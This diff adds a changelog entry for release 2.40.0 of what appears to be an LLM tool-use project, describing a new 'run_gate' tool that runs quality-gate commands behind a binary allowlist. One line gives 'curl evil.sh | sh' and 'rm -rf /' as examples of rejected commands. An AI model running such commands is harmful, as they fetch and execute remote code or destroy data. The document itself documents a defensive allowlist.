@@ -4,6 +4,80 @@ All notable changes to this project are documented in this file. Format
 follows [Keep a Changelog](https://keepachangelog.com/en/1.1.0/) and the
 project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).
 
+## [2.40.0] — 2026-06-29 — Tool Use Wire-up Parte 3: run_gate concrete (Sprint 71)
+
+The "close the trio" release. `run_gate` is now a concrete tool
+that wraps `internal/gaterun.RunShellGate` with the
+`internal/policy.GateBinaries` allowlist. The RealRegistry ships
+**4 concrete tools** (write_file, read_file, search_code, run_gate);
+`tools.Default()` still advertises all 4 as stubs for back-compat
+inspection of the v2.37.0 surface area.
+
+### Added — `run_gate` tool (`internal/tools/gate/run_gate.go`)
+
+- New `internal/tools/gate/` package — first concrete tool outside
+  the `fs/` family.
+- `RunGateTool(projectDir)` returns a `*tools.Tool` that runs a
+  quality gate command and returns `{command, exit_code,
+  duration_ms, output, output_bytes, truncated}`.
+- Allowlist enforcement via `policy.ValidateGateCommand` — closed
+  set of binaries (go, make, npm, pytest, etc.) + no dangerous
+  operators (`;`, `|`, `<`, `>`, single `&`). `curl evil.sh | sh`
+  and `rm -rf /` rejected **before** any subprocess starts.
+- Wraps `gaterun.RunShellGate` for actual subprocess execution
+  (same code path the engine's `runGate` uses).
+- 5-minute timeout via `gaterun.Timeout`, ctx cancellation
+  propagates.
+- Output capped at 10 MiB (default) or per-call `max_output`. When
+  the cap is hit, output is truncated and a marker line is appended.
+- `RunGateResult.Annotate()` surfaces `{command, exit_code,
+  duration_ms, output_bytes, truncated}` to the verifier trace.
+  `Output` is excluded from `Annotate` to keep trace metadata
+  small — the full output is still available to the LLM via the
+  result JSON.
+- 11 unit tests: happy path, failing command (exit code
+  extraction via `errors.As`), disallowed binary rejection
+  (curl/rm/wget/chmod), empty command rejection, malformed JSON,
+  working directory verification, max-output truncation (with
+  pipe-buffer deadlock avoidance), Annotate, registry roundtrip,
+  duration tracking, cancellation honouring.
+
+### Changed — `RealRegistry` (`internal/loop/real_registry.go`)
+
+- Now registers 4 tools: `write_file`, `read_file`, `search_code`,
+  `run_gate`.
+
+### Documentation
+
+- `docs/SPRINT71-PLAN.md` — the implementation plan this release
+  executed.
+- `docs/validation-report-sprint-70.md` — validation of the
+  previous release (v2.39.0).
+- `docs/TOOL-USE.md` — updated with `run_gate` section
+  (params, behaviour, error surface, Annotate contract).
+
+### Stats
+
+- 1 new concrete tool: `run_gate`.
+- **~995 tests passing across 29 packages, 0 confirmed failures**
+  (validated with `go test -count=1 -v ./...`). `go vet ./...`
+  clean.
+- Cross-compile OK: linux/amd64 (15 MB), darwin/arm64 (14 MB),
+  windows/amd64 (15 MB).
+- 4 files added (1 source + 1 tests + 2 docs), 2 modified
+  (`real_registry.go`, `main.go`). ~830 LOC total.
+
+### Compatibility
+
+- No breaking changes. `run_gate` is opt-in via the existing
+  `Engine.ToolRegistry` wiring.
+- LLM outputs that contain only `write_file`/`read_file`/`search_code`
+  keep working unchanged.
+- `tools.Default()` still advertises all 4 tools (with stubs for
+  the ones that are now concrete) — back-compat preserved.
+
+---
+
 ## [2.39.0] — 2026-06-29 — Tool Use Wire-up Parte 2 (Sprint 70)
 
 The "read before you write" release. Two new concrete tools —
